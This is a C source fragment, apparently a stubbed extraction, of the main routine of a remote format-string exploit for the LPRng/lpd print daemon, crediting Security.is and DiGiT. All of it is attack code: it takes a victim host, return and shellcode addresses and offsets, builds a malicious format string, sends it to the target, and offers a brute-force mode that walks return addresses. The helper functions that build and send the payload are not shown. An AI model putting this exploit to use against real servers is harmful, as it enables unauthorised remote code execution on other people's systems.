
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int exploit_buffer ;
struct TYPE_2__ {int eip_address; int shellcode_address; int align; int position; char* os_name; void* written_bytes; } ;


 int EOF ;
 int OFFSET_LIMIT ;
 int SHELLCODE_COUNT ;
 int address_buffer ;
 void* atoi (int ) ;
 int brute ;
 char* create_malicious_string () ;
 int exit (int) ;
 scalar_t__ failure ;
 int * gethostbyname (char*) ;
 int getopt (int,char**,char*) ;
 int * he ;
 int herror (char*) ;
 char* hostname ;
 int memset (char*,char,int) ;
 int offset ;
 int optarg ;
 int printf (char*,...) ;
 int send_code (char*) ;
 int strcat (char*,char*) ;
 int strcpy (char*,int ) ;
 int strncmp (char*,char*,int) ;
 void* strtoul (int ,int *,int) ;
 TYPE_1__* targets ;
 size_t type ;
 int usage (char*) ;

int main(int argc, char **argv)
{

   char exploit_buffer[1024];
   char *format = ((void*)0);
   int c, brutecount=0;



if(argc < 3)
  {
    usage(argv[0]);
    return 1;
 }

      hostname = argv[1];

if(!strncmp(argv[2], "brute", 5)) brute = 1;


      while(( c = getopt (argc, argv, "t:r:c:a:o:p:w:k"))!= EOF){

      switch (c)
        {

         case 't':
            type = atoi(optarg);
            break;

         case 'r':
            targets[type].eip_address = strtoul(optarg, ((void*)0), 16);
            break;

         case 'c':
            targets[type].shellcode_address = strtoul(optarg, ((void*)0), 16);
            break;

         case 'a':
            targets[type].align = atoi(optarg);
            break;

         case 'o':
            offset = atoi(optarg);
            break;

         case 'p':
            targets[type].position = atoi(optarg);
            break;

         case 'w':
            targets[type].written_bytes = atoi(optarg);
            break;

        default:
          usage(argv[0]);
          return 1;
        }
   }

       if(type < 0)
         {
    printf("You must specify a type!\n");
    printf("example: ./SEClpd victim -t 0\n");
    return -1;
        }

   if ( (he = gethostbyname (hostname)) == ((void*)0))
   {
     herror("gethostbyname");
     exit(1);
   }

  targets[type].shellcode_address = targets[type].eip_address + SHELLCODE_COUNT;


   printf("+++ Security.is remote exploit for LPRng/lpd by DiGiT\n\n");

   printf("+++ Exploit information\n");
   printf("+++ Victim: %s\n", hostname);
   printf("+++ Type: %d - %s\n", type, targets[type].os_name);
   printf("+++ Eip address: 0x%x\n", targets[type].eip_address);
   printf("+++ Shellcode address: 0x%x\n", targets[type].shellcode_address);
   printf("+++ Position: %d\n", targets[type].position);
   printf("+++ Alignment: %d\n", targets[type].align);
   printf("+++ Offset %d\n", offset);
   printf("\n");

   printf("+++ Attacking %s with our format string\n", hostname);

if( brute > 0 )
 {

  printf("+++ Brute force man, relax and enjoy the ride ;>\n");
   targets[type].eip_address = 0xbffffff0;

 while(failure)

  {
 memset(exploit_buffer, '\0', sizeof(exploit_buffer));

   format = create_malicious_string();
   strcpy(exploit_buffer, address_buffer);
   strcat(exploit_buffer, format);
   strcat(exploit_buffer, "\n");
   send_code(exploit_buffer);

 targets[type].eip_address = 0xbffffff0 - offset;

  offset+=4;

    if (offset > OFFSET_LIMIT) {
        printf("+++ Offset limit hit, ending brute mode ;<\n");
        return -1;

       }
    }
}


else

   format = create_malicious_string();
   strcpy(exploit_buffer, address_buffer);
   strcat(exploit_buffer, format);
   strcat(exploit_buffer, "\n");
   send_code(exploit_buffer);

 printf("Argh exploit failed$#%! try brute force!\n");

   return (-1);
}
